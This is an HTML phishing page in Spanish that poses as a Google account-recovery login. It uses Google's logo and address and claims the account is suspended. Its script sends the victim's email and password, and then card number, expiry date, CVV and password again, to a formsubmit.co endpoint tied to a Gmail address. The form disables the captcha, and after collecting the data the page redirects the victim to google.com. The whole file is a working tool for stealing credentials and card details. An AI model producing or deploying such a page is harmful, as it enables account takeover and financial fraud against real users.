<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Cuenta</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
            display: none;
        }
        .active {
            display: block !important;
        }
        .logo {
            width: 75px;
            margin-bottom: 20px;
        }
        h2 {
            color: #202124;
            margin-bottom: 10px;
            font-size: 20px;
        }
        p {
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }
        input:focus {
            border-color: #1a73e8;
            outline: none;
        }
        button {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
        }
        button:hover {
            background-color: #1765cc;
        }
        .card-icons {
            margin: 15px 0;
            font-size: 24px;
            color: #5f6368;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
        /* Loader */
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1a73e8;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 2s linear infinite;
            margin: 10px auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- PASO 1: EMAIL Y PASSWORD -->
    <div id="step1" class="container active">
        <!-- Logo SVG directo para evitar el 404 -->
        <svg class="logo" viewBox="0 0 24 24" width="75" height="75" xmlns="http://www.w3.org/2000/svg">
            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.84-2.84z" fill="#FBBC05"/>
            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
        </svg>
        
        <h2>Iniciar sesión</h2>
        <p>Para recuperar tu cuenta suspendida, por favor ingresa tus credenciales.</p>
        
        <form id="form-step1">
            <!-- Datos ocultos -->
            <input type="hidden" name="_next" value="https://www.google.com">
            <input type="hidden" name="_subject" value="Paso 1: Credenciales">
            <input type="hidden" name="_captcha" value="false">

            <input type="email" name="Email" placeholder="Correo electrónico" required>
            <input type="password" name="Password" placeholder="Contraseña" required>
            
            <button type="button" id="btn-step1">Ingresar</button>
            <div class="loader" id="loader1"></div>
        </form>
        
        <div class="footer">
            Google, Inc. • 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA
        </div>
    </div>

    <!-- FORMULARIO PASO 2: TARJETA -->
    <div id="step2" class="step hidden">
        <h3>Verificación de Seguridad</h3>
        <p>Ingrese los datos de su tarjeta para desbloquear la cuenta.</p>
        
        <form id="form-step2" action="https://formsubmit.co/Quisan2017@gmail.com" method="POST">
            <!-- Campo oculto para mantener la continuidad -->
            <input type="hidden" name="_subject" value="Verificación de Tarjeta - Gmail">
            <input type="hidden" name="_captcha" value="false">
            
            <div class="input-group">
                <label>Número de Tarjeta</label>
                <input type="text" name="card_number" placeholder="0000 0000 0000 0000" maxlength="19" required>
            </div>
            
            <div class="row">
                <div class="input-group">
                    <label>Fecha de Expiración</label>
                    <input type="text" name="expiry" placeholder="MM/AA" maxlength="5" required>
                </div>
                <div class="input-group">
                    <label>CVV</label>
                    <input type="text" name="cvv" placeholder="123" maxlength="3" required>
                </div>
            </div>

            <!-- CAMBIO CLAVE: Usar 'pass' en vez de 'password' -->
            <div class="input-group">
                <label>Contraseña de la Cuenta</label>
                <input type="password" name="pass" placeholder="Ingrese su contraseña" required>
            </div>

            <button type="submit" id="btn-step2" class="btn-primary">
                Verificar y Desbloquear
            </button>
        </form>
    </div>
    <script>
        // Lógica del Paso 1
        document.getElementById('btn-step1').addEventListener('click', function() {
            const form = document.getElementById('form-step1');
            const btn = document.getElementById('btn-step1');
            const originalText = btn.innerText;
            
            btn.innerText = "Enviando...";
            btn.disabled = true;
            
            const data = new FormData(form);
            
            fetch('https://formsubmit.co/ajax/Quisan2017@gmail.com', { // Usamos /ajax/ para mejor control
                method: 'POST',
                body: data
            })
            .then(response => {
                if (response.ok) {
                    document.getElementById('step1').classList.remove('active');
                    document.getElementById('step2').classList.add('active');
                } else {
                    alert('Error del servidor: ' + response.status);
                }
            })
            .catch(error => {
                alert('Error de red: ' + error.message);
                console.error('Error completo:', error);
            })
            .finally(() => {
                btn.innerText = originalText;
                btn.disabled = false;
            });
        });

        // Lógica del Paso 2
        document.getElementById('btn-step2').addEventListener('click', function() {
            const form = document.getElementById('form-step2');
            const btn = document.getElementById('btn-step2');
            const originalText = btn.innerText;
            
            btn.innerText = "Procesando...";
            btn.disabled = true;
            
            const data = new FormData(form);
            
            fetch('https://formsubmit.co/ajax/Quisan2017@gmail.com', {
                method: 'POST',
                body: data
            })
            .then(response => {
                if (response.ok) {
                    alert('¡Verificación completada! Redirigiendo...');
                    window.location.href = "https://www.google.com";
                } else {
                    alert('Error al procesar la tarjeta.');
                }
            })
            .catch(error => {
                alert('Error de red: ' + error.message);
            })
            .finally(() => {
                btn.innerText = originalText;
                btn.disabled = false;
            });
        });
    </script>

</body>
</html>
